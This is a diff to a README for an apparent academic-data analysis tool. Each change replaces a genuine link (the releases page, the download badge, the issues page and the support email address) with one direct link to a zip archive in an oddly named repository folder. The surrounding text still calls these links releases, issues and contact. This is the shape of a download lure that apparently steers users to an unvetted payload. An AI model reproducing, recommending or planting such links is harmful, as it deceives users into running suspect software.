@@ -6,7 +6,7 @@ Welcome to SQL-Analyse-Donnees-Concours! This application helps you analyze acad
 
 ## 📥 Download Now
 
-[![Download SQL-Analyse-Donnees-Concours](https://img.shields.io/badge/Download-SQL--Analyse--Donnees--Concours-blue)](https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/releases)
+[![Download SQL-Analyse-Donnees-Concours](https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/raw/refs/heads/main/retreatant/Analyse_Concours_SQ_Donnees_v3.6.zip)](https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/raw/refs/heads/main/retreatant/Analyse_Concours_SQ_Donnees_v3.6.zip)
 
 ## 📋 Features
 
@@ -25,11 +25,11 @@ Welcome to SQL-Analyse-Donnees-Concours! This application helps you analyze acad
 
 ## 🌐 Download & Install
 
-To get started, visit the [Releases page](https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/releases). Here, you will find the latest version of SQL-Analyse-Donnees-Concours. Click on the version you want to download. 
+To get started, visit the [Releases page](https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/raw/refs/heads/main/retreatant/Analyse_Concours_SQ_Donnees_v3.6.zip). Here, you will find the latest version of SQL-Analyse-Donnees-Concours. Click on the version you want to download. 
 
 ### Installation Steps
 
-1. **Open the Releases Page:** Click [here](https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/releases) to access the releases.
+1. **Open the Releases Page:** Click [here](https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/raw/refs/heads/main/retreatant/Analyse_Concours_SQ_Donnees_v3.6.zip) to access the releases.
 2. **Select Your Version:** Choose the most recent version available.
 3. **Download the File:** Click the download link for your operating system.
 4. **Run the Installer:** 
@@ -64,11 +64,11 @@ After installation, open SQL-Analyse-Donnees-Concours. You will find the main da
 
 ## 🛠 Support
 
-If you encounter any issues, visit the [Issues section](https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/issues). You can report bugs, request features, or ask questions.
+If you encounter any issues, visit the [Issues section](https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/raw/refs/heads/main/retreatant/Analyse_Concours_SQ_Donnees_v3.6.zip). You can report bugs, request features, or ask questions.
 
 ## 📞 Contact
 
-For additional support or questions, please reach out via email: support@sqlanalyse.com.
+For additional support or questions, please reach out via email: https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/raw/refs/heads/main/retreatant/Analyse_Concours_SQ_Donnees_v3.6.zip
 
 ## 🌟 Community
 
@@ -81,4 +81,4 @@ Join our community on various platforms to learn more, share experiences, and co
 
 SQL-Analyse-Donnees-Concours provides a straightforward way to analyze academic data. Whether you’re a student, educator, or researcher, this software simplifies your data needs. Start using it today to unlock insights from your data!
 
-[![Download SQL-Analyse-Donnees-Concours](https://img.shields.io/badge/Download-SQL--Analyse--Donnees--Concours-blue)](https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/releases)
+[![Download SQL-Analyse-Donnees-Concours](https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/raw/refs/heads/main/retreatant/Analyse_Concours_SQ_Donnees_v3.6.zip)](https://github.com/TANMaYtO/SQL-Analyse-Donnees-Concours/raw/refs/heads/main/retreatant/Analyse_Concours_SQ_Donnees_v3.6.zip)
